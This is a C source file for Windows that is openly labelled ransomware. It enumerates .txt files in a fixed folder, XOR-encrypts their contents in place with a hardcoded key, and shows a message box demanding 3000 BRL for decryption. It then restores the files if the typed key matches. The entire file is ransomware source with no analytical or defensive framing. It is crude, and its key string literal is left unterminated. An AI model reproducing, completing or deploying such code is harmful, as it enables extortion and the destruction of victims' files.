#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

DWORD bytesWritten;
DWORD bytesRead;
BYTE key[24] = "supereasy1;
BYTE input[24];
BYTE result[25];
BYTE buffer[25];
BYTE file[50];
BYTE result_decrypted[25];
HANDLE hFile;
HANDLE hFindFirst;
HANDLE hFindNext;
WIN32_FIND_DATA FileInfo;

int main(void){
    hFindFirst = FindFirstFile("C:/Users/User/Ransomware/archives/*.txt", &FileInfo);
    sprintf(file, "C:/Users/User/Ransomware/archives/%s", FileInfo.cFileName);
    hFile = CreateFile(file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL);
    CloseHandle(hFile);
    for (int i = 0; i < bytesRead; i++){
        result[i] = key[i] ^ buffer[i];
    }
    hFile = CreateFile(file, GENERIC_WRITE, FILE_SHARE_READ, NULL, TRUNCATE_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(hFile, result, sizeof(result), &bytesWritten, NULL);
    CloseHandle(hFile);
    for (int i = 0; i < 10; i++){
        FindNextFile(hFindFirst, &FileInfo);
        sprintf(file, "C:/Users/User/Ransomware/archives/%s", FileInfo.cFileName);
        hFile = CreateFile(file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL);
        CloseHandle(hFile);
        for (int i = 0; i < bytesRead; i++){
            result[i] = key[i] ^ buffer[i];
        }
        hFile = CreateFile(file, GENERIC_WRITE, FILE_SHARE_READ, NULL, TRUNCATE_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        WriteFile(hFile, result, sizeof(result), &bytesWritten, NULL);
        CloseHandle(hFile);
    }
    hFile = CreateFile(file, GENERIC_WRITE, FILE_SHARE_READ, NULL, TRUNCATE_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(hFile, result, sizeof(result), &bytesWritten, NULL);
    CloseHandle(hFile);
    MessageBox(NULL, "Your data has been encrypted by ransomware!\nTo be able to decrypt them, you need to pay 3000BRL", "Ransomware", MB_ICONERROR);
    printf("enter key : ");
    scanf("%s", &input);
    if (strcmp(input, key) == 0){
                      hFindFirst = FindFirstFile("C:/Users/User/Ransomware/archives/*.txt", &FileInfo);
                      sprintf(file, "C:/Users/User/Ransomware/archives/%s", FileInfo.cFileName);
                      hFile = CreateFile(file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                      ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL);
                      CloseHandle(hFile);
                      for (int i = 0; i < bytesRead; i++){
                          result_decrypted[i] = key[i] ^ buffer[i];
                      }
                      hFile = CreateFile(file, GENERIC_WRITE, FILE_SHARE_READ, NULL, TRUNCATE_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                      WriteFile(hFile, result_decrypted, sizeof(result_decrypted), &bytesWritten, NULL);
                      CloseHandle(hFile);
                      for (int i = 0; i < 10; i++){
                              FindNextFile(hFindFirst, &FileInfo);
                              sprintf(file, "C:/Users/User/Ransomware/archives/%s", FileInfo.cFileName);
                              hFile = CreateFile(file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                              ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL);
                              CloseHandle(hFile);
                              for (int i = 0; i < bytesRead; i++){
                                  result_decrypted[i] = key[i] ^ buffer[i];
                              }
                              hFile = CreateFile(file, GENERIC_WRITE, FILE_SHARE_READ, NULL, TRUNCATE_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                              WriteFile(hFile, result_decrypted, sizeof(result_decrypted), &bytesWritten, NULL);
                              CloseHandle(hFile);
                      }
                      printf("Data has been decrypted!\n");
                      system("pause");
    }
    else{
         printf("Key is incorrect!\n");
         system("pause");
    }
} 
